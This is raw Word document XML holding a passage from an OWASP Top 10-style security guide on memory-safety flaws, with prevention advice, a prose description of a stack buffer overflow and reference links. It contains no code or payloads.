    <w:p w14:paraId="4F288708" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3822" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3823" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    been many sandbox escapes over the years that prove that just</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="60D12D2C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3824" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3825" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    because the web application language is nominally memory “safe,” the</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="53BEE712" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3826" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3827" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    foundations are not.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5DB38191" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3828" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A7E8452" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3829" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3830" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   **How to prevent**. Many modern APIs are now written in memory-safe</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="72A72629" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3831" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3832" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    languages such as Rust or Go. In the case of Rust, memory safety is</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="116FF413" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3833" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3834" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    a crucial feature of the language. For existing code, the use of</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0EF33613" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3835" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3836" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    strict compiler flags, strong typing, static code analysis, and fuzz</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="236E4115" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3837" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3838" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    testing can be beneficial in identifying memory leaks, memory, and</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="57C395B9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3839" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3840" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    array overruns, and more.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0553C4E9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3841" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79B5C4EE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3842" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3843" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   **Example attack scenarios**. Buffer and heap overflows have been a</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4D50D7B2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3844" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3845" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    mainstay of attackers over the years. The attacker sends data to a program, which it stores in an undersized stack buffer. The result is that information on the call stack is overwritten, including the function’s return pointer. The data sets the value of the return pointer so that when the function returns, it transfers control to malicious code contained in the attacker’s data.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="316F9D9C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3846" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21FE2A43" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3847" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3848" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   **References**</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2EA815D9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3849" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3850" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    - [OWASP Vulnerabilities: Buffer </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Overflow](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://owasp.org/www-community/vulnerabilities/Buffer_Overflow) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="015AE094" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3851" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3852" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    - [OWASP Attacks: Buffer </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Overflow](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://owasp.org/www-community/attacks/Buffer_overflow_attack) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="166650D4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3853" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3854" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    - [Science Direct: Integer </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Overflow](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://www.sciencedirect.com/topics/computer-science/integer-overflow) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6E379E4B" w14:textId="77777777" w:rsidR="00E300D6" w:rsidRDefault="00E300D6" w:rsidP="00AC649A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00E300D6" w:rsidSect="00841D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04"/>
    <w:rsid w:val="00060B87"/>
    <w:rsid w:val="0009677C"/>
    <w:rsid w:val="00096903"/>
    <w:rsid w:val="000C5070"/>
    <w:rsid w:val="00225B64"/>
    <w:rsid w:val="0024421C"/>
    <w:rsid w:val="003A277D"/>
    <w:rsid w:val="003A6212"/>
    <w:rsid w:val="003E073E"/>
    <w:rsid w:val="004107D9"/>
    <w:rsid w:val="00474B8C"/>
    <w:rsid w:val="0050725B"/>
    <w:rsid w:val="00534EDD"/>
    <w:rsid w:val="005C43E9"/>
    <w:rsid w:val="00627CCE"/>
    <w:rsid w:val="006408E8"/>
    <w:rsid w:val="006D28BD"/>
    <w:rsid w:val="00723C24"/>
    <w:rsid w:val="00745235"/>
    <w:rsid w:val="00841D1E"/>
    <w:rsid w:val="00855904"/>
    <w:rsid w:val="008915DC"/>
    <w:rsid w:val="008D179A"/>
    <w:rsid w:val="0098591F"/>
    <w:rsid w:val="009E530B"/>
    <w:rsid w:val="00A05092"/>
    <w:rsid w:val="00A36437"/>
    <w:rsid w:val="00A5669C"/>
    <w:rsid w:val="00A70057"/>
    <w:rsid w:val="00AC649A"/>
    <w:rsid w:val="00B10F9D"/>
    <w:rsid w:val="00B74248"/>
    <w:rsid w:val="00CD5147"/>
    <w:rsid w:val="00D93324"/>
    <w:rsid w:val="00DF0FAC"/>
    <w:rsid w:val="00E13797"/>
    <w:rsid w:val="00E300D6"/>
    <w:rsid w:val="00EE3E07"/>
    <w:rsid w:val="00EE6233"/>
    <w:rsid w:val="00EF59BD"/>
    <w:rsid w:val="00EF6F09"/>
    <w:rsid w:val="00FA69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115D"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{2FA04880-F073-437B-8129-57CA6775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74248"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="NichtaufgelsteErwhnung">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="Absatz-Standardschriftart"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00B74248"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Listenabsatz">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Standard"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="00AC649A"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTMLVorformatiert">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Standard"/>
    <w:link w:val="HTMLVorformatiertZchn"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00AC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AC649A"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:kern w:val="0"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:eastAsia="de-DE"/>
      <w14:ligatures w14:val="none"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="berarbeitung">
    <w:name w:val="Revision"/>
    <w:hidden/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00AC64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170">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="208229592">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="357853123">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="546526059">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="559093574">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="616370185">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="713234858">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="871188984">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="889458234">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1030573796">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1060523746">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1091661326">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1157185462">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1160654307">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1235822024">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1346395414">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1481729579">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1642072093">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
